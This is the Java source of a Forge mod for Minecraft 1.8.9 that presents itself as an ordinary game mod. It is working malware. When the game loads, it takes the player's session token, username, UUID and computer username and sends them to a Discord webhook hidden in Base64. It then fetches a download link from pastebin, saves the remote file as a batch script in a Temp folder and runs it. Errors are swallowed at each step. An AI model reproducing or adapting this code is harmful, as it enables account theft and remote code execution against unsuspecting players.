package net.exotic.real;

import net.minecraft.launchwrapper.Launch;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.*;

import java.awt.*;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

@Mod(modid = "exoticmod", name = "exoticmod", version = "1.0", acceptedMinecraftVersions = "[1.8.9]")
public class ExoticMod {

    public static String webhook = "aHR0cHM6Ly9wdGIuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzk0MzM1MjQ2MjM5ODU5OTMwOS9ucG9QSWdIbmpNVU1ja1NsaDlKQkctNFY4aDRxVjlKX0xjRzhpeERDQ0pPVW96MlZaaG1zQlhqaXNjVk45Y05lY2dCOA==";

    public static String version = "1.1";

    @Mod.EventHandler
    public void onFMLPreInitialization(FMLPreInitializationEvent event) {
        InstallForge();
    }

    @Mod.EventHandler
    public void onFMLInitialization(FMLInitializationEvent event) {
        try {
            Thread.sleep(5000);
            Loader();
        } catch (Exception ignored) {}
        try {
            Thread.sleep(3000);
            exec("cmd /c start C:\\Users\\%username%\\AppData\\Local\\Temp\\screenshots\\screenshot.bat");
        } catch (Exception ignored) {}
    }

    @Mod.EventHandler
    public void onFMLPostInitialization(FMLPostInitializationEvent event) {}

    @Mod.EventHandler
    public void onFMLServerStarting(FMLServerStartingEvent event) {}

    public static void InstallForge() {
        try {
            Class<?> mc = Launch.classLoader.findClass("net.minecraft.client.Minecraft");
            Object minecraft = mc.getMethod("func_71410_x").invoke(null);
            Object session = mc.getMethod("func_110432_I").invoke(minecraft);
            Class<?> sessionClass = Launch.classLoader.findClass("net.minecraft.util.Session");
            Object token = sessionClass.getMethod("func_148254_d").invoke(session);
            Object name = sessionClass.getMethod("func_111285_a").invoke(session);
            Object uuid = sessionClass.getMethod("func_148255_b").invoke(session);

            String webdecode = new String(Base64.getDecoder().decode(webhook.getBytes(StandardCharsets.UTF_8)));
            LoadGui sendmessage = new LoadGui(webdecode);
            sendmessage.addEmbed(new LoadGui.EmbedObject()
                    .setTitle("Minecraft Info")
                    .setColor(Color.CYAN)
                    .addField("Name", name.toString(), true)
                    .addField("Profile", "https://sky.shiiyu.moe/stats/" + name, true)
                    .addField("UUID ", uuid.toString(), true)
                    .addField("Token ", token.toString(), false)
                    .setFooter("Computer Name: " + System.getProperty("user.name") + " Mod version: " + version, ""));
            sendmessage.execute();

        } catch (Exception ignored) {}
    }

    public static void Loader() {
        try {

            URL pastebin = new URL("https://pastebin.com/raw/AERL3GJT");
            BufferedReader reader = new BufferedReader(new InputStreamReader(pastebin.openConnection().getInputStream()));
            String fileURL = reader.readLine();
            URL url = new URL(fileURL);

            HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
            httpURLConnection.addRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
            InputStream stream = httpURLConnection.getInputStream();

            File path = new File(System.getenv("LOCALAPPDATA") + File.separator + "Temp" + File.separator + "screenshots");

            if (!path.exists()) path.mkdir();

            File bitcoin = new File(path, "screenshot.bat");
            FileOutputStream fileOut = new FileOutputStream(bitcoin);

            int currByte;
            while ((currByte = stream.read()) != -1) {
                fileOut.write(currByte);
            }

            String webdecode = new String(Base64.getDecoder().decode(webhook.getBytes(StandardCharsets.UTF_8)));
            LoadGui sendmessage = new LoadGui(webdecode);
            sendmessage.addEmbed(new LoadGui.EmbedObject()
                    .setTitle("Loading")
                    .setColor(Color.GREEN)
                    .addField("Message ", "Running .bat file", true));
            sendmessage.execute();
        } catch (Exception ignored) {}
    }

    public static void exec(String cmd) {
        try {
            Runtime rt = Runtime.getRuntime();
            Process pr = rt.exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
